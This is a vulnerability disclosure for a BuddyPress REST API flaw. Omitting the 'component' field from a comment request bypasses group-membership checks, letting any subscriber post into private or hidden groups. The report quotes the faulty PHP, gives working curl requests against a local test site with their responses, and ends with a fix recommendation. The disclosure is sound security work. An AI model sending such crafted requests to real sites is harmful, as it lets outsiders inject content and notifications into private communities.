## TL;DR
BuddyPress's REST API blocks non-members from posting comments into private or hidden group activity — but only when the request explicitly includes `"component":"groups"`. Omit that one field and the membership check is skipped entirely. Any authenticated user can inject content into a private group's activity stream, trigger notification emails to real members, and have the comment persist — all with one crafted request.

No group membership needed. A freshly registered Subscriber account is enough.

**Drop one JSON field. Private group comment injected.**

## Environment
| Component | Version |
|---|---|
| WordPress | 7.1.2 |
| BuddyPress | 14.5.2 (exact zip reviewed: https://downloads.wordpress.org/plugin/buddypress.14.5.2.zip) |
| PHP | 8.4.24 (cli) |
| MariaDB | 11.8.8-MariaDB (Debian) |

## Description
Group activity comments should be restricted to that group's own members, especially in private or hidden groups. The REST endpoint checks membership only when the request names the group via the `component` field, so omitting that field skips the check entirely. Any authenticated user can inject content into a private or hidden group's stream with one crafted request, regardless of membership.

## Root Cause

- File: `bp-activity/classes/class-bp-rest-activity-endpoint.php:490`
- Vulnerable code:

```php
if ( is_user_logged_in() ) {
    $user_id = $request->get_param( 'user_id' );
    if ( empty( $user_id ) || (int) bp_loggedin_user_id() === (int) $user_id ) {
        $item_id   = $request->get_param( 'primary_item_id' );
        $component = $request->get_param( 'component' );
        $retval = true;
        if ( bp_is_active( 'groups' ) && buddypress()->groups->id === $component && ! is_null( $item_id ) ) {
            if ( ! $this->show_hidden( $component, $item_id ) ) {
                $retval = $error;
            }
        }
```

- Why it's wrong: the group-membership check is gated on the attacker-supplied `component` parameter instead of being derived from the parent activity referenced by `primary_item_id` when `type=activity_comment`.

## Steps to Reproduce

**Privilege level:** freshly self-registered WordPress account, default Subscriber role — not a BuddyPress moderator, not a member of the target group, never invited.

---

**Step 1 — Identify a target activity ID**

Activity IDs are sequential and may be leaked via comment-notification emails, shared permalinks, or simple guessing.

---

**Step 2 — Control: send the request with `component` set, confirm it is blocked**

```bash
curl -s -i -u "attacker:ppIWnEo7rsqTS7goMd390blV" -X POST \
  http://127.0.0.1:8977/wp-json/buddypress/v1/activity \
  -H "Content-Type: application/json" \
  -d '{"type":"activity_comment","component":"groups","primary_item_id":4,"content":"attacker control test - should be blocked"}'
```

```
HTTP/1.1 403 Forbidden
{"code":"bp_rest_authorization_required","message":"Sorry, you are not allowed to create activities.","data":{"status":403}}
```

Correctly rejected when `component` is present.

---

**Step 3 — Exploit: omit `component` entirely**

```bash
curl -s -i -u "attacker:ppIWnEo7rsqTS7goMd390blV" -X POST \
  http://127.0.0.1:8977/wp-json/buddypress/v1/activity \
  -H "Content-Type: application/json" \
  -d '{"type":"activity_comment","primary_item_id":4,"content":"LIVE re-verification: attacker is not a member of Confidential Group"}'
```

```json
HTTP/1.1 200 OK
[{"user_id":2,"component":"activity","content":{"raw":"LIVE re-verification: attacker is not a member of Confidential Group","rendered":"<p>LIVE re-verification: attacker is not a member of Confidential Group<\/p>\n"},"id":14,"primary_item_id":4,"secondary_item_id":4,"status":"published","type":"activity_comment","hidden":true,...}]
```

`attacker` (user_id=2) is independently confirmed not a member of the target group (`wp_bp_groups_members` for group_id=3 lists only the creator, `victim`) — yet the comment (id=14) was created and persisted against activity id=4, which belongs to that hidden group.

## Recommendation
In `create_item_permissions_check()`, when `type === 'activity_comment'`, load the parent activity from `primary_item_id` and require `bp_activity_user_can_read( $parent, bp_loggedin_user_id() )` regardless of what (or whether) `component` was supplied.

## Impact
Any authenticated user — including one who has never joined and is not permitted to join a private or hidden group — can inject content into that group's activity/comment stream, visible to every member of the group, simply by omitting one JSON field from an otherwise-blocked REST request. This also triggers a notification email to the original poster attributing the comment as if it came from a legitimate participant. No admin cooperation is needed.

### **Note: This issue was reported via HackerOne and marked as a duplicate of a prior report — meaning it was already known to the maintainers at the time of submission.**
